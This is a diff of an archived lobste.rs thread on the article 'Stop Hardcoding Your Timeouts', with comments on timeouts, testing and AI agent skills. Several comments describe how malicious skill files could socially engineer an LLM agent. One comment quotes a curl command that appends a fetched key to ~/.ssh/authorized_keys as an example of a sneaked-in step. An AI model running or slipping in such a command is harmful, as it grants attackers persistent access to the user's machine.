@@ -5,14 +5,14 @@ post:
   title: Stop Hardcoding Your Timeouts
   url: https://alfy.blog/2026/04/23/stop-hardcoding-your-timeouts.html
   hn_url: https://lobste.rs/s/qa0owz
-  score: 53
+  score: 59
   author: bahlo
   posted_at: '2026-11-02T19:22:32Z'
-  fetched_at: '2026-11-03T13:46:23Z'
+  fetched_at: '2026-11-03T20:48:24Z'
   article_url: https://alfy.blog/2026/04/23/stop-hardcoding-your-timeouts.html
   article_fetch_status: success
-  article_fetched_at: '2026-11-03T13:46:24Z'
-  raw_comment_count: 10
+  article_fetched_at: '2026-11-03T20:48:29Z'
+  raw_comment_count: 22
   tags:
   - practices
 comments:
@@ -26,7 +26,7 @@ comments:
     The workaround I found? Clone the repo manually first, then install from the local copy. It works, mostly. Except now skills-lock.json points to a path on my machine. My colleagues cannot use it. I also have to update my copy everytime I want update my skills. One workaround creates a lot of other problems.
 
     But I'm still confused, can't they just...git exclude or gitignore the skills-lock.json? And why do you even need a lockfile for what is essentially documentation?? And is running an extra git pull really such a hassle?
-  score: 3
+  score: 5
   posted_at: '2026-11-02T21:57:41Z'
 - id: lo-sacvcr
   parent_id: '0'
@@ -35,14 +35,14 @@ comments:
     Skills are, effectively, executable code that happens to be written in human language. The reason to have automation around it is to make it easy for the entire team to use the same set, and the reason to have a lock file is to avoid a supply chain attack where benign/helpful instructions are replaced with malicious ones.
     If we were in the habit of pulling docs down locally for humans, you'd want the same behaviours anyway. Humans are also vulnerable to prompt injection attacks. We just call it "phishing" or "social engineering".
     (This is not an endorsement of AI usage, but is an endorsement of contextually-appropriate threat modelling.)
-  score: 7
+  score: 8
   posted_at: '2026-11-02T22:42:16Z'
 - id: lo-ysvhdk
   parent_id: '0'
   author: pmarreck
   text: If you actually fucking test timeouts properly, you'll quickly (ahem) realize
     why they need to be injected instead of hardcoded!
-  score: 10
+  score: 18
   posted_at: '2026-11-03T04:29:51Z'
 - id: lo-7dyme1
   parent_id: '0'
@@ -50,7 +50,7 @@ comments:
   text: Cool article but nothing whatsoever to do with disability and shouldn’t be
     tagged under accessibility even if the domain name happens to look a lot like
     the abbreviation a11y.
-  score: 2
+  score: 5
   posted_at: '2026-11-03T06:34:16Z'
 - id: lo-ucwhnn
   parent_id: '0'
@@ -80,7 +80,7 @@ comments:
     Since the author won’t, I will.
     The skills case shouldn’t have a timeout at all: it’s the wrong place and the wrong thing. You rather want to check if it’s still working, and Git has that handled. The problematic case is if it can get stalled waiting for authentication, and I’m not convinced that can happen in a way that needs to be catered for. If it’s interactive, the user will observe the authentication prompt and so the timeout cutting them off is wrong, and if it’s not interactive then it should fail immediately. I’m inclined to presume it’s slop-style cargo-culting (in which area Chesterton’s fence is an increasingly unreliable rubric).
     As for the Docker Gordon case, well, for a human tool I’d just say there shouldn’t  be any timeout, it’s obviously dumb, the human will observe if things aren’t working as expected and interrupt it. For AI nonsense, well, this sounds to me like the wrong way to apply a timeout. I would rather expect it to throw an LLM at it and its logs or something to apply judgement like the human would, to see if it seems like it’s not working or stuck and interrupt it. A hard timeout is obviously idiotic, but a timeout at all feels from the wrong era of computing for such a thing.
-  score: 5
+  score: 8
   posted_at: '2026-11-03T07:41:20Z'
 - id: lo-xzjl1b
   parent_id: '0'
@@ -90,7 +90,7 @@ comments:
     to those who don't have big-tech-hub-tier internet connections. This article is
     definitely worthwhile but I'm not sure it particularly fits better under any other
     tags.
-  score: 3
+  score: 4
   posted_at: '2026-11-03T08:51:44Z'
 - id: lo-e7ipin
   parent_id: '0'
@@ -100,15 +100,139 @@ comments:
     then you can even test multi-minute timeouts in under a second total. Just fast
     forward time to "just before timeout", check there is none, then forward past
     the timeout and check the timeout worked.
-  score: 5
+  score: 12
   posted_at: '2026-11-03T09:07:47Z'
 - id: lo-khv42h
   parent_id: '0'
   author: klingtnet
   text: At least in Go I don't really care about the actual timeout when testing because
     of synctest.
-  score: 2
+  score: 3
   posted_at: '2026-11-03T09:16:16Z'
+- id: lo-pw614t
+  parent_id: '0'
+  author: schneems
+  text: |-
+    Yes and: every network IO or command shell out should have some timeout even if it's a wild maximum.
+    It's a little annoying that agents don't exec tool calls in the background and poll them by default. The number of times I've walked away and come back to find it deadlocked itself 30 seconds into a 30 minute task is non zero.
+  score: 2
+  posted_at: '2026-11-03T14:17:30Z'
+- id: lo-f90bnn
+  parent_id: '0'
+  author: geocar
+  text: |-
+    I'd like to add: They don't need to be injected if you can derive them.
+
+    TCP comes with RTT information (for example) for free (via getsockopt), which you can put right back into TCP_USER_TIMEOUT to detect dead links fast (very very important if you've got a poor sap who wants to try 10gbps over TCP)
+    Terminals (e.g. over ssh) can be induced to respond (e.g. using CSI c / DA) which can give you something similar on the tty: No need to guess what VTIME should be!
+
+    Sometimes timeouts are nice, and if there's a way to tell the user how to choose one that's the best. Sometimes a benchmarking mode can help.
+    But I think choosing a timeout is also often mysterious, and without context usually produces worse results not better, since it isn't probably the sort of thing that gets tested very often, and to demand good choices before using the software puts a lot of pressure on the user that might harm their ability to be successful.
+    So I too think a lot of timeouts just don't need to be there; if TCP is really supposed to offer anything at all, we should be able to wait until it connects and just trust the kernel's retry timer.  What else are we going to do besides retry or abort, and shouldn't that be up to the user? They could press ^C whenever they want... The gordon example almost certainly should have done this.
+  score: 2
+  posted_at: '2026-11-03T14:32:58Z'
+- id: lo-a0rdyf
+  parent_id: '0'
+  author: tclancy
+  text: This feels wildly uncharitable to me. The vercel repo has a template for bug
+    tickets that requires the exact fields the ticket author filled out. They also
+    went a little further in a follow up comment to point out other cases of the same
+    issue (whether that was strictly helpful is debatable). Moreover, one assumes
+    they added a bug report template because they were tired of drive by bug reports
+    like “cloning repositories can take arbitrarily long, so putting a 60 second timeout
+    is obviously wrong”. One might also suggest the use of an unnecessary “obviously”
+    in there would not make for a great bug report.
+  score: 3
+  posted_at: '2026-11-03T14:33:50Z'
+- id: lo-kugl7m
+  parent_id: '0'
+  author: intelfx
+  text: |-
+    Skills are not executable code
+
+
+    Calling a skill twice doesn't send theh code again, for example
+
+    Not in the regular sense of a blob of imperatively executable code injected at $pc, no, but an LLM isn't an imperative execution engine either.
+    Perhaps a skill is more like a dynamically loadable library, that creates new nodes and vertices in the "local worldview" graph of an LLM?
+  score: 2
+  posted_at: '2026-11-03T14:58:16Z'
+- id: lo-e4aahs
+  parent_id: '0'
+  author: emk
+  text: |-
+    Skills absolutely include executable code, often right next to the SKILL.md file. The SKILL.md file will say something like "Run do_x.py to do X", and do_y.py will be sitting right there with actual code, right in the skill directory.
+    LLMs are extremely susceptible to something analogous to "social engineering" attacks. Some of the smarter ones might read do_x.py and notice that something is amiss. But if do_x.py downloads and installs an innocent-looking external tool, the LLM will almost certainly assume this is normal.
+  score: 4
+  posted_at: '2026-11-03T15:12:05Z'
+- id: lo-jzfhod
+  parent_id: '0'
+  author: anordal
+  text: |-
+    Nah, the 2-min timeout in Docker Gordon sounds deliberate:
+    When debugging a docker build issue, the first thing you need to do is split the failing step, so you don't need to download the same gigabytes again and again.
+    AI makes it so easy to abuse computing power rather than get your iteration cycle down. Perhaps there are legit uses of hard limits in this age.
+  score: 1
+  posted_at: '2026-11-03T15:29:55Z'
+- id: lo-fifbrk
+  parent_id: '0'
+  author: JulianSildenLanglo
+  text: Yeah even something as simple as sneaking in a little curl https://example.com/publickey
+    >> ~/.ssh/authorized_keys can have serious side effects.
+  score: 1
+  posted_at: '2026-11-03T15:54:50Z'
+- id: lo-65rpbb
+  parent_id: '0'
+  author: chrismorgan
+  text: |-
+    As regards the issue description: sorry, I erred there, I think I was doing something else in between and got it confused. Or maybe I got fed up with the obvious slop and was heading out of there as quickly as I could. No, that one’s fine. Still a bit unnecessarily verbose even with a template, but fine.
+    But the following comment really is that bad. It’s clearly from an LLM, heading down a rabbit hole, presenting stupidly-precise irrelevant (and subjective!) figures, tackling the wrong problem, and giving a ridiculous solution.
+    I’ve reflected on “cloning repositories can take arbitrarily long, so putting a 60 second timeout is obviously wrong” and decided that, although I didn’t intend that it be that brief and blunt (it’s a prose description of the essence; I’d have used a blockquote if I were suggesting precise wording), I do think that even so it would still be an acceptable (though not great) issue description on its own. It genuinely does say all that needs to be said.
+  score: 3
+  posted_at: '2026-11-03T17:03:41Z'
+- id: lo-0yzx50
+  parent_id: '0'
+  author: chrismorgan
+  text: |-
+    Silly thought that came to me from combining this with https://lobste.rs/s/qvdatp/jailbreaking_my_car_s_navigation_system: should these things refuse to run files on noexec file systems?
+    (I know noexec is about direct execution and shebangs and such, not script names passed as arguments like python example.py.)
+  score: 2
+  posted_at: '2026-11-03T17:08:50Z'
+- id: lo-zrkjlu
+  parent_id: '0'
+  author: david_chisnall
+  text: Last time I did anything seriously network facing, I used FreeBSD's Netgraph
+    framework for testing.  It makes it trivial to simulate links with different latencies
+    and different packet-drop rates.  How well does your system work with a 500ms
+    RTT and a 20% packet-drop rate?  Who knows, let's find out!
+  score: 3
+  posted_at: '2026-11-03T18:00:42Z'
+- id: lo-eti6ea
+  parent_id: '0'
+  author: sunshine
+  text: |-
+    That pgrep -f matched my own shell again (same mistake as earlier).
+
+
+    pgrep matched its own shell, so the fake server never started.
+
+
+    All three hide-mode runs pass. (pgrep only matched its own shell command, not a sandbox holder.)
+
+
+    My pkill -f matched its own shell and killed the loop (a known trap).
+
+    Daily occurrence for me.
+  score: 2
+  posted_at: '2026-11-03T19:07:54Z'
+- id: lo-xrlnhd
+  parent_id: '0'
+  author: tonyarkles
+  text: Lol, I'm glad I'm not alone in that. Have you figured out a solution at all?
+    I haven't really tried yet but seeing you post it has made me a little itchy to
+    try to figure it out.
+  score: 1
+  posted_at: '2026-11-03T19:39:58Z'
 article:
   url: https://alfy.blog/2026/04/23/stop-hardcoding-your-timeouts.html
   title: Stop Hardcoding Your Timeouts
@@ -185,4 +309,4 @@ article:
     The web and the tools we build on top of it are for everyone. Let’s start acting like it.
   error:
   fetched_at: '2026-11-03T05:42:59Z'
-archived_at: '2026-11-03T13:46:25Z'
+archived_at: '2026-11-03T20:48:29Z'
